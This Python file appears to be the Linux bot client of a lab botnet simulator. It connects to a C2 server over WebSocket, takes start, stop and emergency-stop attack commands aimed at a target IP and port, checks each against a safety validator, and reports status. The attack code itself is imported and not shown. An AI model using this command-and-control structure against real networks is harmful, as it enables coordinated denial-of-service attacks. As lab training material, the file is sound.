"""
Main bot client application for Linux systems.
"""
import asyncio
import json
import logging
import signal
import sys
from datetime import datetime
from typing import Optional, Dict, Any

from shared.config import LabConfig
from shared.models import BotStatus, AttackConfig, AttackType
from shared.utils import setup_logging, generate_bot_id, get_local_ip, get_hostname
from .websocket_client import WebSocketClient
from .safety_validator import SafetyValidator
from .attack_modules import AttackManager


class BotClient:
    """Main bot client for Linux systems."""
    
    def __init__(self, config: LabConfig):
        self.config = config
        self.bot_id = config.bot_client.bot_id or generate_bot_id()
        
        # Setup logging
        self.logger = setup_logging(
            config.bot_client.log_level,
            config.bot_client.log_file
        )
        
        # Initialize components
        self.websocket_client = WebSocketClient(config.bot_client, self.bot_id)
        self.safety_validator = SafetyValidator(config.network, config.safety)
        self.attack_manager = AttackManager()
        
        # State
        self.running = False
        self.current_status = BotStatus.DISCONNECTED
        
        # Register message handlers
        self._register_message_handlers()
        
        self.logger.info(f"Bot client initialized: {self.bot_id}")
    
    def _register_message_handlers(self):
        """Register WebSocket message handlers."""
        self.websocket_client.register_message_handler("command", self._handle_command)
        self.websocket_client.register_message_handler("ping", self._handle_ping)
        self.websocket_client.register_message_handler("status_request", self._handle_status_request)
    
    async def start(self) -> bool:
        """Start the bot client."""
        if self.running:
            self.logger.warning("Bot client already running")
            return True
        
        try:
            self.running = True
            self.current_status = BotStatus.CONNECTED
            
            # Start WebSocket client
            success = await self.websocket_client.start()
            if not success:
                self.logger.error("Failed to start WebSocket client")
                self.running = False
                return False
            
            self.logger.info(f"Bot client started: {self.bot_id}")
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to start bot client: {e}")
            self.running = False
            return False
    
    async def stop(self):
        """Stop the bot client."""
        self.running = False
        self.current_status = BotStatus.DISCONNECTED
        
        try:
            # Stop any active attacks
            await self.attack_manager.stop_attack()
            
            # Stop WebSocket client
            await self.websocket_client.stop()
            
            self.logger.info("Bot client stopped")
        
        except Exception as e:
            self.logger.error(f"Error stopping bot client: {e}")
    
    async def _handle_command(self, message: Dict[str, Any]):
        """Handle command messages from C2 server."""
        try:
            command_data = message.get("data", {})
            command_id = message.get("command_id")
            command_type = command_data.get("command")
            
            self.logger.info(f"Received command: {command_type} (ID: {command_id})")
            
            # Send acknowledgment
            if command_id:
                await self.websocket_client.send_command_response(
                    command_id, 
                    "command_acknowledged"
                )
            
            # Handle specific commands
            if command_type == "start_attack":
                await self._handle_start_attack(command_data, command_id)
            
            elif command_type == "stop_attack":
                await self._handle_stop_attack(command_id)
            
            elif command_type == "update_attack":
                await self._handle_update_attack(command_data, command_id)
            
            elif command_type == "emergency_stop":
                await self._handle_emergency_stop(command_id)
            
            elif command_type == "status_request":
                await self._handle_status_request(message)
            
            elif command_type == "disconnect":
                await self._handle_disconnect(command_id)
            
            else:
                self.logger.warning(f"Unknown command type: {command_type}")
                if command_id:
                    await self.websocket_client.send_command_response(
                        command_id,
                        "command_failed",
                        {"error": f"Unknown command: {command_type}"}
                    )
        
        except Exception as e:
            self.logger.error(f"Error handling command: {e}")
            if command_id:
                await self.websocket_client.send_command_response(
                    command_id,
                    "command_failed",
                    {"error": str(e)}
                )
    
    async def _handle_start_attack(self, command_data: Dict[str, Any], command_id: Optional[str]):
        """Handle start attack command."""
        try:
            # Parse attack configuration
            attack_config_data = command_data.get("attack_config")
            if not attack_config_data:
                raise ValueError("Missing attack configuration")
            
            attack_config = AttackConfig(**attack_config_data)
            
            self.logger.info(f"Starting attack: {attack_config.attack_type.value} -> {attack_config.target_ip}:{attack_config.target_port}")
            
            # Validate attack before starting
            is_valid, validation_report = self.safety_validator.validate_before_attack(attack_config)
            
            if not is_valid:
                error_msg = f"Attack validation failed: {validation_report.get('errors', [])}"
                self.logger.error(error_msg)
                
                if command_id:
                    await self.websocket_client.send_command_response(
                        command_id,
                        "command_failed",
                        {"error": error_msg, "validation_report": validation_report}
                    )
                return
            
            # Log any warnings
            for warning in validation_report.get("warnings", []):
                self.logger.warning(f"Attack validation warning: {warning}")
            
            # Start attack
            success = await self.attack_manager.start_attack(attack_config)
            
            if success:
                self.current_status = BotStatus.ATTACKING
                self.logger.info("Attack started successfully")
                
                if command_id:
                    await self.websocket_client.send_command_response(
                        command_id,
                        "command_completed",
                        {"status": "attack_started"}
                    )
                
                # Start sending attack status updates
                asyncio.create_task(self._attack_status_reporter())
            
            else:
                error_msg = "Failed to start attack"
                self.logger.error(error_msg)
                
                if command_id:
                    await self.websocket_client.send_command_response(
                        command_id,
                        "command_failed",
                        {"error": error_msg}
                    )
        
        except Exception as e:
            self.logger.error(f"Error starting attack: {e}")
            if command_id:
                await self.websocket_client.send_command_response(
                    command_id,
                    "command_failed",
                    {"error": str(e)}
                )
    
    async def _handle_stop_attack(self, command_id: Optional[str]):
        """Handle stop attack command."""
        try:
            success = await self.attack_manager.stop_attack()
            
            if success:
                self.current_status = BotStatus.CONNECTED
                self.logger.info("Attack stopped successfully")
                
                if command_id:
                    await self.websocket_client.send_command_response(
                        command_id,
                        "command_completed",
                        {"status": "attack_stopped"}
                    )
            else:
                error_msg = "Failed to stop attack"
                self.logger.error(error_msg)
                
                if command_id:
                    await self.websocket_client.send_command_response(
                        command_id,
                        "command_failed",
                        {"error": error_msg}
                    )
        
        except Exception as e:
            self.logger.error(f"Error stopping attack: {e}")
            if command_id:
                await self.websocket_client.send_command_response(
                    command_id,
                    "command_failed",
                    {"error": str(e)}
                )
    
    async def _handle_update_attack(self, command_data: Dict[str, Any], command_id: Optional[str]):
        """Handle update attack command."""
        try:
            # For now, we'll stop current attack and start new one
            # In a more sophisticated implementation, we could update parameters on the fly
            
            await self.attack_manager.stop_attack()
            await self._handle_start_attack(command_data, command_id)
        
        except Exception as e:
            self.logger.error(f"Error updating attack: {e}")
            if command_id:
                await self.websocket_client.send_command_response(
                    command_id,
                    "command_failed",
                    {"error": str(e)}
                )
    
    async def _handle_emergency_stop(self, command_id: Optional[str]):
        """Handle emergency stop command."""
        try:
            self.logger.critical("Emergency stop command received")
            
            # Emergency stop all attacks
            await self.attack_manager.emergency_stop()
            self.current_status = BotStatus.CONNECTED
            
            if command_id:
                await self.websocket_client.send_command_response(
                    command_id,
                    "command_completed",
                    {"status": "emergency_stop_executed"}
                )
            
            self.logger.critical("Emergency stop completed")
        
        except Exception as e:
            self.logger.error(f"Error during emergency stop: {e}")
            if command_id:
                await self.websocket_client.send_command_response(
                    command_id,
                    "command_failed",
                    {"error": str(e)}
                )
    
    async def _handle_disconnect(self, command_id: Optional[str]):
        """Handle disconnect command."""
        try:
            self.logger.info("Disconnect command received")
            
            if command_id:
                await self.websocket_client.send_command_response(
                    command_id,
                    "command_completed",
                    {"status": "disconnecting"}
                )
            
            # Stop the bot client
            await self.stop()
        
        except Exception as e:
            self.logger.error(f"Error during disconnect: {e}")
    
    async def _handle_ping(self, message: Dict[str, Any]):
        """Handle ping message."""
        try:
            # Send pong response
            await self.websocket_client.send_message("pong", {
                "timestamp": datetime.now().isoformat(),
                "bot_id": self.bot_id
            })
        
        except Exception as e:
            self.logger.error(f"Error handling ping: {e}")
    
    async def _handle_status_request(self, message: Dict[str, Any]):
        """Handle status request."""
        try:
            status = await self._get_bot_status()
            
            await self.websocket_client.send_message("status_response", status)
        
        except Exception as e:
            self.logger.error(f"Error handling status request: {e}")
    
    async def _attack_status_reporter(self):
        """Periodically report attack status to C2 server."""
        try:
            while self.current_status == BotStatus.ATTACKING and self.running:
                # Get attack status
                attack_status = self.attack_manager.get_attack_status()
                
                # Send status update
                await self.websocket_client.send_message("attack_status", attack_status)
                
                # Wait before next update
                await asyncio.sleep(5)  # Report every 5 seconds
        
        except Exception as e:
            self.logger.error(f"Error in attack status reporter: {e}")
    
    async def _get_bot_status(self) -> Dict[str, Any]:
        """Get comprehensive bot status."""
        try:
            # Get system safety status
            is_safe, safety_status = self.safety_validator.check_system_safety()
            
            # Get attack status
            attack_status = self.attack_manager.get_attack_status()
            
            # Get connection stats
            connection_stats = self.websocket_client.get_connection_stats()
            
            # Get network interface info
            interfaces_valid, interfaces_info = self.safety_validator.validate_network_interfaces()
            
            status = {
                "bot_id": self.bot_id,
                "ip_address": get_local_ip(),
                "hostname": get_hostname(),
                "status": self.current_status.value,
                "timestamp": datetime.now().isoformat(),
                "system_safety": safety_status,
                "attack_status": attack_status,
                "connection_stats": connection_stats,
                "network_interfaces": interfaces_info,
                "safety_violations": self.safety_validator.get_safety_violations(10)
            }
            
            return status
        
        except Exception as e:
            self.logger.error(f"Error getting bot status: {e}")
            return {
                "bot_id": self.bot_id,
                "status": "error",
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            }
    
    async def run(self):
        """Main run loop for the bot client."""
        try:
            # Start the bot client
            success = await self.start()
            if not success:
                return
            
            # Keep running until stopped
            while self.running:
                await asyncio.sleep(1)
        
        except KeyboardInterrupt:
            self.logger.info("Received interrupt signal")
        except Exception as e:
            self.logger.error(f"Error in main run loop: {e}")
        finally:
            await self.stop()


def signal_handler(bot_client: BotClient):
    """Handle system signals for graceful shutdown."""
    def handler(signum, frame):
        logging.info(f"Received signal {signum}, shutting down...")
        asyncio.create_task(bot_client.stop())
    
    return handler


async def main():
    """Main entry point for bot client."""
    try:
        # Load configuration
        config = LabConfig.load_from_env()
        
        # Create bot client
        bot_client = BotClient(config)
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, signal_handler(bot_client))
        signal.signal(signal.SIGTERM, signal_handler(bot_client))
        
        # Run bot client
        await bot_client.run()
    
    except Exception as e:
        logging.error(f"Fatal error in bot client: {e}")
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())